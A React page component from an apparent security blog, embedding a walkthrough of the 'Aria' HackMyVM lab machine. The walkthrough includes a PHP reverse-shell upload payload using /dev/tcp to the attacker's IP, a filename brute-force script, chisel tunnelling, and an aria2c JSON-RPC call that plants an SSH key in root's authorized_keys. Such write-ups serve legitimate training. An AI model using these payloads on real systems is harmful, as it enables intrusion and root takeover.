import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import ScrollToTop from '../../../components/ScrollToTop';
import InfoStatus from '../../../components/InfoStatus';
import DynamicSEO from '../../../components/DynamicSEO';
import './AriaWalkthrough.css';

const AriaWalkthrough = () => {
  const navigate = useNavigate();

  // CodeBlock component for terminal-like code blocks
  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);
    
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };

    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';

    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button 
            className={'copy-button ' + (copied ? 'copied' : '')}
            onClick={handleCopy}
            title={copied ? 'Copied!' : 'Copy to clipboard'}
          >
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  // Aria Walkthrough data
  const writeup = {
    id: 'aria-walkthrough',
    title: 'Aria Walkthrough',
    excerpt: 'Aria is a Linux machine that demonstrates file upload bypass techniques, zero-width steganography, and JSON-RPC exploitation through aria2c. The machine showcases how improper input validation and services running with elevated privileges can lead to complete system compromise.',
    date: 'Oct 04, 2025',
    tags: ['Linux', 'Hmv', 'Steg', 'Aria2c', 'Json-rpc'],
    difficulty: 'Easy',
    os: 'Linux',
    ip: '192.168.0.11',
    content: `# Aria Walkthrough

## Overview
Aria is a Linux machine that demonstrates file upload bypass techniques, zero-width steganography, and JSON-RPC exploitation through aria2c. The machine showcases how improper input validation and services running with elevated privileges can lead to complete system compromise.

## Enumeration
### Port Scanning
Executing a port scanning with nmap. From the nmap scan we have an indication that the target is running a Linux machine with \`Apache\`, \`SSH\` and a custom service called \`Aria Debug Shell\` running on port 1337.
\`\`\`bash
nmap -vv -sS -sV -sC -Pn -p- -oN nmap/nmap.log 192.168.0.9

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Ultra-Secure Naming Service
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
1337/tcp open  waste?  syn-ack ttl 64
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck: 
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|   GenericLines: 
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|     Command not found: 
|     Command not found:
|   GetRequest: 
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|     Command not found: GET / HTTP/1.0
|     Command not found:
|   HTTPOptions: 
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|     Command not found: OPTIONS / HTTP/1.0
|     Command not found:
|   Help: 
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|     Command not found: HELP
|   Kerberos: 
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|     Command not found: qj
|   RTSPRequest: 
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|     Command not found: OPTIONS / RTSP/1.0
|     Command not found:
|   SSLSessionReq, TerminalServerCookie: 
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|     Command not found:
|   TLSSessionReq: 
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|     Command not found: 
|_    random1random2random3random4
\`\`\`

We can see some important open ports:
• **Port 22**: SSH service running OpenSSH
• **Port 80**: HTTP service running Apache
• **Port 1337**: Aria Debug Shell service

### Service Enumeration
Port 80 it's running a chinese page that tells to the user some functionalities from the page. This is a file upload page that get the timestamp from the uploaded file, select a random number from 1 to 1000 and save the file as a md5 hash on the system. Also the application only allows  \`.gif\`, \`.jpeg\` and \`.png\` files and block the \`<?php\` string.
![Service Enumeration](/images/writeups/aria/1.png)

Fuzzing files and directories.
![Service Enumeration](/images/writeups/aria/2.png)

Connecting and interacting into service that still running on 1337 port.
\`\`\`bash
nc 192.168.0.11 1337
\`\`\`
![Service Enumeration](/images/writeups/aria/3.png)

## Foothold
### Exploitation
Capture the upload requisition, increment a jpeg magic byte, change the "Content-Type" header to a jpeg file and add the payload below to bypass the restrictions and to receive a reverse shell. 
\`\`\`bash
<?= exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.7/2557 0>&1'");?>
\`\`\`
![Service Enumeration](/images/writeups/aria/4.png)
![Service Enumeration](/images/writeups/aria/5.png)

To find the exact name of the file, created a python script that pass the timestamp and increment + and - 5 seconds, then run the range from 1 to 1000 on the random number, transform all results to an md5 hash and save it to a file.
\`\`\`python
#!/usr/bin/env python3
from datetime import datetime, timezone
import hashlib
import os

#---------- CONFIG ----------
#Base time (UTC)
base_dt = datetime(2025, 9, 26, 19, 53, 12, tzinfo=timezone.utc)
delta_start = -5
delta_end = 5
#rand range 1..1000 inclusive
rand_min = 1
rand_max = 1000
out_path = "/home/v01/Machines/HMV/Aria/md5-php.txt"
#----------------------------

base_ts = int(base_dt.timestamp())


out_dir = os.path.dirname(out_path)
if out_dir and not os.path.isdir(out_dir):
    try:
        os.makedirs(out_dir, exist_ok=True)
    except Exception as e:
        print(f"Falha ao criar diretório {out_dir}: {e}")
        raise

total = (delta_end - delta_start + 1) * (rand_max - rand_min + 1)
written = 0

with open(out_path, "w") as outf:
    for delta in range(delta_start, delta_end + 1):
        ts = base_ts + delta
        for r in range(rand_min, rand_max + 1):
            s = f"{ts}{r}"
            md5 = hashlib.md5(s.encode()).hexdigest()
            outf.write(md5 + ".php\\n")
            written += 1

print(f"Gerado {written} entradas e salvo em: {out_path}\\n")

print("Primeiras 10 entradas:")
with open(out_path, "r") as f:
    for i in range(10):
        line = f.readline()
        if not line:
            break
        print(line.strip())

print("\\nÚltimas 10 entradas:")
with open(out_path, "rb") as f: 
    try:
        f.seek(0)
        lines = f.read().splitlines()
        for line in lines[-10:]:
            print(line.decode())
    except Exception:
        # fallback robusto
        with open(out_path, "r") as ff:
            lines = ff.readlines()
            for line in lines[-10:]:
                print(line.strip())
\`\`\`

Using ffuf to find the file on \`uploads\` directory.
\`\`\`bash
ffuf -u "http://192.168.0.11/uploads/FUZZ" -w /home/v01/Machines/HMV/Aria/md5-php.txt
\`\`\`
![Service Enumeration](/images/writeups/aria/6.png)

### User Flag
Receiving shell as \`www-data\`:
\`\`\`bash
nc -lnvp 2557
\`\`\`
![Service Enumeration](/images/writeups/aria/7.png)

Retrieving the user flag.
![Service Enumeration](/images/writeups/aria/8.png)

### Lateral Movement
Running the \`linpeas\` script, we will find that the user \`Aria\` have the \`aira\` password.
![Service Enumeration](/images/writeups/aria/9.png)
![Service Enumeration](/images/writeups/aria/10.png)

## Privilege Escalation
The root user it's executing the \`aria2c\` binary and passing a config file.
\`\`\`bash
ps aux | grep aria2c
\`\`\`
![Service Enumeration](/images/writeups/aria/11.png)

We will find that the port 6800 is open locally on system.
\`\`\`bash
ss -lntp
\`\`\`
![Service Enumeration](/images/writeups/aria/12.png)

Making a port forward to my local machine with chisel.
• Attacker machine:
\`\`\`bash
chisel server --reverse -p 9090
\`\`\`

• Target machine:
\`\`\`bash
./chisel client 192.168.0.7:9090 R:6800:127.0.0.1:6800
\`\`\`

With nmap we will find that it's running a \`JSON-RPC\` into \`aria2c\` service.
\`\`\`bash
sudo nmap -vv -sS -sV -sC -p6800 127.0.0.1

PORT     STATE SERVICE REASON         VERSION
6800/tcp open  http    syn-ack ttl 64 aria2 downloader JSON-RPC
|_http-cors: GET POST OPTIONS
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: OPTIONS
\`\`\`

\`\`\`bash
curl -X POST http://127.0.0.1:6800/jsonrpc
\`\`\`
![Service Enumeration](/images/writeups/aria/15.png)

Looking the \`user.txt\` file, we can see some strange and blank spaces. Might have some hidden content on that file.
![Service Enumeration](/images/writeups/aria/13.png)

Created a script do extract the information with the "Zero-width steganography" technique, we will find a secret token.
\`\`\`python
#!/usr/bin/env python3
import re

FILENAME = "user.txt"

with open(FILENAME, "r", encoding="utf-8", errors="ignore") as f:
    data = f.read()

#pega só U+200B (zero width space) e U+200C (zero width non-joiner)
zw = re.findall(r'\\u200B\\u200C', data)
bits = ''.join('0' if c == '\\u200B' else '1' for c in zw)

#agrupa em bytes
bytes_list = [bits[i:i+8] for i in range(0, len(bits), 8)]
bs = bytes(int(b, 2) for b in bytes_list if len(b) == 8)

print(bs.decode("utf-8", errors="ignore"))
\`\`\`

Executing the script to retrieve the secret token.
\`\`\`bash
python3 steg.py
\`\`\`
![Service Enumeration](/images/writeups/aria/14.png)

<InfoStatus 
  title="Zero-Width Steganography Explanation:" 
  message="Zero-width steganography technique is the practice of hiding data inside a text file using invisible Unicode characters.

• **U+200B** (ZERO WIDTH SPACE) → bit 0
• **U+200C** (ZERO WIDTH NON-JOINER) → bit 1

How it works:
• The hider inserts those invisible characters into the text in sequence.
• The extractor finds all U+200B / U+200C in the file (in order).
• Map each character to 0 or 1.
• Group bits into 8 → bytes.
• Convert bytes to text (UTF-8) → revealed secret (token: maze-sec)." 
  type="error" 
/>

We can use that token to interact with \`JSON-RPC\` via curl, that still running as root user.
\`\`\`bash
curl -s -X POST http://127.0.0.1:6800/jsonrpc -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":"1","method":"aria2.getVersion","params":["token:maze-sec"]}'
\`\`\`
![Service Enumeration](/images/writeups/aria/16.png)

With that token, we can interact with \`JSON-RPC\` via curl and overwrite a specific root file. To explore that privilege we can create a keypair and wirte into the \`authorized_keys\` file.
\`\`\`bash
ssh-keygen -t rsa -b 4096
\`\`\`

Saving an \`authorized_keys\` on my local machine.
\`\`\`bash
mv id_rsa.pub authorized_keys
\`\`\`
![Service Enumeration](/images/writeups/aria/17.png)

Open a local python server.
\`\`\`bash
python3 -m http.server 80
\`\`\`
![Service Enumeration](/images/writeups/aria/18.png)

Downloading the \`authorized_keys\` file to the root \`.ssh\` directory.
\`\`\`
curl -s -X POST http://127.0.0.1:6800/jsonrpc \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "id":"1",
    "method":"aria2.addUri",
    "params":[
      "token:maze-sec",
      ["http://192.168.0.7/authorized_keys"],
      {"dir":"/root/.ssh/", "out":"authorized_keys"}
    ]
  }'
\`\`\`

### Root Flag
Finally we are able to pass the private key and authenticate as root user. Also retrieving the root flag.
\`\`\`bash
chmod 600 id_rsa
ssh root@192.168.0.11 -i id_rsa
\`\`\`
![Service Enumeration](/images/writeups/aria/19.png)

# Conclusion
This machine demonstrated various Linux exploitation techniques and privilege escalation methods:

• **File Upload Bypass**: Exploited file upload restrictions by manipulating magic bytes and Content-Type headers to upload PHP shells
• **Steganography**: Used zero-width steganography to extract hidden authentication tokens from text files
• **JSON-RPC Exploitation**: Leveraged aria2c's JSON-RPC interface running as root to download and overwrite system files
• **SSH Key Injection**: Created SSH key pairs and used aria2c to download authorized_keys to gain root access

The machine highlighted the importance of proper input validation, secure file handling, and the risks of running services with elevated privileges.

# Tools Used
• **Nmap** - Port scanning and service enumeration
• **Burp Suite** - Intercepting and modifying HTTP requests
• **Python** - Custom scripts for MD5 hash generation and steganography extraction
• **ffuf** - Directory and file brute forcing
• **chisel** - Port forwarding and tunneling
• **curl** - Interacting with JSON-RPC API
• **SSH** - Remote access and key management

# References
• [aria2c Documentation](https://aria2.github.io/manual/en/html/)
• [JSON-RPC Specification](https://www.jsonrpc.org/specification)
• [Zero-Width Steganography](https://null-byte.wonderhowto.com/how-to/use-zero-width-characters-hide-secret-messages-text-even-reveal-leaks-0198692/)
• [File Upload Security Best Practices](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
• [SSH Key Management](https://www.ssh.com/academy/ssh/key)

`
  };

  return (
    <>
      <DynamicSEO 
        type="writeup" 
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: `/images/writeups/aria/machine.png`,
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }} 
      />
      <motion.div 
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1>{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/aria/machine.png" alt="Aria Walkthrough" className="machine-image" />
              </div>
            </div>
          </div>
        </motion.div>
      </div>

      <div className="writeup-layout">
        <motion.div 
          className="writeup-content"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4, duration: 0.6 }}
        >
          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{line.substring(2)}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{line.substring(3)}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{line.substring(4)}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks with CodeBlock component
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('<InfoStatus')) {
                  // Handle InfoStatus components
                  const infoStatusLines = [];
                  let j = i;
                  let infoStatusContent = '';
                  
                  while (j < lines.length && !lines[j].includes('/>')) {
                    infoStatusLines.push(lines[j]);
                    j++;
                  }
                  
                  if (j < lines.length) {
                    infoStatusLines.push(lines[j]);
                    infoStatusContent = infoStatusLines.join('\n');
                    
                    // Parse InfoStatus props from the content
                    const titleMatch = infoStatusContent.match(/title="([^"]+)"/);
                    const messageMatch = infoStatusContent.match(/message="([^"]+)"/);
                    const typeMatch = infoStatusContent.match(/type="([^"]+)"/);
                    
                    if (titleMatch && messageMatch) {
                        const title = titleMatch[1];
                        let message = messageMatch[1];
                        const type = typeMatch ? typeMatch[1] : 'info';
                        
                        // Process message to handle line breaks and formatting
                        message = message.replace(/\\n/g, '\n');
                        
                        elements.push(
                          <InfoStatus 
                            key={i} 
                            title={title} 
                            message={message} 
                            type={type} 
                          />
                        );
                    }
                    
                    i = j; // Skip the processed lines
                  }
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.trim()) {
                  // Process inline markdown within paragraphs
                  const processInlineMarkdown = (text) => {
                    const parts = [];
                    let lastIndex = 0;
                    
                    // First process bold text (**text**)
                    let processedText = text;
                    const boldRegex = /\*\*([^*]+)\*\*/g;
                    let match;
                    
                    while ((match = boldRegex.exec(text)) !== null) {
                      // Add text before the bold
                      if (match.index > lastIndex) {
                        processedText = processedText.substring(0, match.index) + 
                          processedText.substring(match.index + match[0].length);
                        parts.push(processedText.substring(lastIndex, match.index));
                      }
                      // Add the bold text
                      parts.push(
                        <strong key={match.index}>
                          {match[1]}
                        </strong>
                      );
                      lastIndex = match.index + match[0].length;
                    }
                    
                    // Add remaining text
                    if (lastIndex < text.length) {
                      parts.push(text.substring(lastIndex));
                    }
                    
                    // Then process inline code and links within the remaining parts
                    const finalParts = [];
                    parts.forEach((part, partIndex) => {
                      if (typeof part === 'string') {
                        const codeRegex = /`([^`]+)`/g;
                        let codeMatch;
                        let codeLastIndex = 0;
                        let codeParts = [];
                        
                        while ((codeMatch = codeRegex.exec(part)) !== null) {
                          // Add text before the code
                          if (codeMatch.index > codeLastIndex) {
                            codeParts.push(part.substring(codeLastIndex, codeMatch.index));
                          }
                          // Add the inline code
                          codeParts.push(
                            <code key={`${partIndex}-${codeMatch.index}`} className="inline-code">
                              {codeMatch[1]}
                            </code>
                          );
                          codeLastIndex = codeMatch.index + codeMatch[0].length;
                        }
                        
                        // Add remaining text
                        if (codeLastIndex < part.length) {
                          codeParts.push(part.substring(codeLastIndex));
                        }
                        
                        // Process links in each part
                        const linkParts = [];
                        codeParts.forEach((codePart, codePartIndex) => {
                          if (typeof codePart === 'string') {
                            const linkRegex = /\[([^\]]+)\]\(([^)]+)\)/g;
                            let linkMatch;
                            let linkLastIndex = 0;
                            let linkProcessedParts = [];
                            
                            while ((linkMatch = linkRegex.exec(codePart)) !== null) {
                              // Add text before the link
                              if (linkMatch.index > linkLastIndex) {
                                linkProcessedParts.push(codePart.substring(linkLastIndex, linkMatch.index));
                              }
                              // Add the link
                              linkProcessedParts.push(
                                <a key={`${partIndex}-${codePartIndex}-${linkMatch.index}`} 
                                   href={linkMatch[2]} 
                                   target="_blank" 
                                   rel="noopener noreferrer"
                                   className="content-link">
                                  {linkMatch[1]}
                                </a>
                              );
                              linkLastIndex = linkMatch.index + linkMatch[0].length;
                            }
                            
                            // Add remaining text
                            if (linkLastIndex < codePart.length) {
                              linkProcessedParts.push(codePart.substring(linkLastIndex));
                            }
                            
                            linkParts.push(...linkProcessedParts);
                          } else {
                            linkParts.push(codePart);
                          }
                        });
                        
                        finalParts.push(...linkParts);
                      } else {
                        finalParts.push(part);
                      }
                    });
                    
                    return finalParts.length > 0 ? finalParts : text;
                  };
                  
                  elements.push(
                    <p key={i}>
                      {processInlineMarkdown(line)}
                    </p>
                  );
                } else {
                  elements.push(<br key={i} />);
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
        <TableOfContents content={writeup.content} />
      </div>
      
      <ScrollToTop />
    </motion.div>
    </>
  );
};

export default AriaWalkthrough;
